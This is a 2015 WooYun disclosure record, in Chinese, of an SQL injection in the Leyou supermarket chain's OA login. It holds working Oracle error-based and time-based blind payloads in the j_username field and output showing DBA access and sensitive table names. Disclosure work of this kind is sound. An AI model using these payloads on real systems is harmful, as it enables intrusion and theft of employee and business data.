{"id": 28102, "wybug_id": "wooyun-2015-0123520", "wybug_title": "乐友某漏洞导致全站数据和所有员工信息会议记录工作信息泄露", "wybug_corp": "乐友(中国)超市连锁有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-29 18:43", "wybug_open_date": "2015-08-14 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向公众公开  简要描述： 233 详细说明：  \nOA系统注射，还是DBA权限。登陆的时候报错，发现注入点报错可以闭合，直接构造注射语句。dynamicpass=123456&encData=&ip=127.0.0.1&isdx=1&isIP=0&isusb=1&j_password=123456&j_username=我是注入点&needauthcode=0&rememberme=0&rndData=603605&sendpass=0&uname=mqitbaej\n   漏洞证明：  \n---Parameter: j_username (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: dynamicpass=g00dPa$$w0rD&encData=&ip=114.247.50.2&isdx=1&isIP=0&isusb=1&j_password=g00dPa$$w0rD&j_username=e') AND 9366=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (9366=9366) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND ('UnIY'='UnIY&needauthcode=0&rememberme=0&rndData=617403727403605&sendpass=0&uname=mqitbaej    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: dynamicpass=g00dPa$$w0rD&encData=&ip=114.247.50.2&isdx=1&isIP=0&isusb=1&j_password=g00dPa$$w0rD&j_username=-5656') OR 8232=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(108)||CHR(100)||CHR(76),5) AND ('cOin'='cOin&needauthcode=0&rememberme=0&rndData=617403727403605&sendpass=0&uname=mqitbaej---back-end DBMS: Oraclecurrent user:    'LEYOUOA'current user is DBA:    Trueavailable databases [24]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] HR[*] IX[*] LEYOUOA[*] MDSYS[*] OE[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDBDatabase: LEYOUOA[552 tables]+-------------------------------+| MODULE                        || ACCOUNTSETTING                || ALBUM                         || ATTACH                        || ATTENDANCE                    || BLOG_APP                      |关于员工| SYSUSER                       || PERMISSIONBATCHACTION         || PERMISSIONBATCHACTIONDETAIL   || PERMISSIONBATCHACTIONGROUP    || WORDMODULE                    || WORKFLOWACCREDIT              || WORKFLOWACTING                || WORKFLOWDOCTYPE               || WORKFLOWINFO                  || WORKFLOWNODESTYLE             || WORKFLOWUSECOUNT              || WORKFLOWVERSION               || WORKFLOWVERSIONLOG            |会议记录| UF_MEETING                    || UF_MEETINGROOM                || UF_MEETINGROOMUSER            || UF_MEETING_LIST               || UF_MEETRECORD                 || UF_MESSAGE_LOG                | UF_ADMIN_MEETING              || UF_ADMIN_MEETINGROOM          |订单信息| UF_ORDER                      || UF_ORDER_FREIGHT              || UF_ORDER_PRODUCT              |奖金| UF_REWARD                     |用户key| USERKEY                       |.......等等大量敏感信息顺利拿到OA管理员账户，想进去看能不能放SHELL，可惜密码是加密的，还没破出来，本来想把员工down出来跑弱口令，但是这样就对企业安全带来一定的风险。所以到这里就结束了。\n   修复方案：  ~~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-30 14:53 厂商回复： 我们尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}